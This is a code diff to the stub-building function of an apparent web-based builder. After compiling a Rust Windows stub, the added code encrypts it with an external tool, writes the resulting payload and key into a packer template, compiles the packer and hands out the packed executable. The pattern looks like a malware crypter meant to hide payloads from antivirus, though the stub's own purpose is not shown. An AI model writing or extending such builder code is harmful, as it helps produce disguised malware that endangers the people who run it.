@@ -362,12 +362,62 @@ def create_stub():
                         result = subprocess.run(compile_cmd, cwd=os.path.join('templates', 'rust_stub'), capture_output=True, text=True, shell=True)
 
                         if result.returncode == 0:
-                            cpp_exe_created = exe_filename
-                            print(f"Successfully compiled Rust stub: {exe_filename}")
+                            print(f"Successfully compiled Rust stub.")
 
-                            # Move the compiled executable to the user's exe folder
-                            compiled_exe_path = os.path.join('templates', 'rust_stub', 'target', 'x86_64-pc-windows-gnu', 'release', 'rust_s.exe')
-                            os.rename(compiled_exe_path, exe_path)
+                            compiled_stub_path = os.path.join('templates', 'rust_stub', 'target', 'x86_64-pc-windows-gnu', 'release', 'rust_s.exe')
+
+                            # Run obin_generator to get payload and key
+                            obin_proc = subprocess.run(['./obin_generator.exe', compiled_stub_path], capture_output=True, text=True)
+                            if obin_proc.returncode != 0:
+                                print(f"obin_generator.exe failed: {obin_proc.stderr}")
+                                return jsonify({'success': False, 'message': 'Failed to encrypt stub.'}), 500
+
+                            output = obin_proc.stdout
+                            try:
+                                payload_line = next(line for line in output.splitlines() if line.startswith('Payload:'))
+                                key_line = next(line for line in output.splitlines() if line.startswith('Secret Key:'))
+                                payload = payload_line.split(':')[1].strip()
+                                key = key_line.split(':')[1].strip()
+                            except StopIteration:
+                                print(f"Could not parse obin_generator.exe output: {output}")
+                                print(f"obin_generator.exe stderr: {obin_proc.stderr}")
+                                return jsonify({'success': False, 'message': 'Failed to parse encryption output.'}), 500
+
+                            # Inject payload and key into packer template
+                            packer_main_path = os.path.join('templates', 'src', 'main.rs')
+                            try:
+                                with open(packer_main_path, 'r') as f:
+                                    original_packer_code = f.read()
+                            except FileNotFoundError:
+                                return jsonify({'success': False, 'message': 'Packer source not found.'}), 500
+
+                            packer_code = original_packer_code.replace('const PAYLOAD: &[u8] = &[\n\n];', f'const PAYLOAD: &[u8] = &[{payload}];')
+                            packer_code = packer_code.replace('const SECRET_KEY: &[u8] = &[\n\n];', f'const SECRET_KEY: &[u8] = &[{key}];')
+
+                            # Write the new packer source
+                            with open(packer_main_path, 'w') as f:
+                                f.write(packer_code)
+
+                            # Compile the packer
+                            packer_compile_cmd = [
+                                'cargo', 'build', '--release', '--target', 'x86_64-pc-windows-gnu'
+                            ]
+                            packer_result = subprocess.run(packer_compile_cmd, cwd='templates', capture_output=True, text=True, shell=True)
+
+                            # Restore original packer source
+                            with open(packer_main_path, 'w') as f:
+                                f.write(original_packer_code)
+
+                            if packer_result.returncode == 0:
+                                cpp_exe_created = exe_filename
+                                print(f"Successfully compiled packer: {exe_filename}")
+
+                                # Move the compiled packer to the user's exe folder
+                                compiled_packer_path = os.path.join('templates', 'target', 'x86_64-pc-windows-gnu', 'release', 'tulpar.exe')
+                                os.rename(compiled_packer_path, exe_path)
+                            else:
+                                print(f"Packer compilation failed: {packer_result.stderr}")
+                                return jsonify({'success': False, 'message': f'Failed to compile packer: {packer_result.stderr}'}), 500
                         else:
                             print(f"Rust compilation failed: {result.stderr}")
 
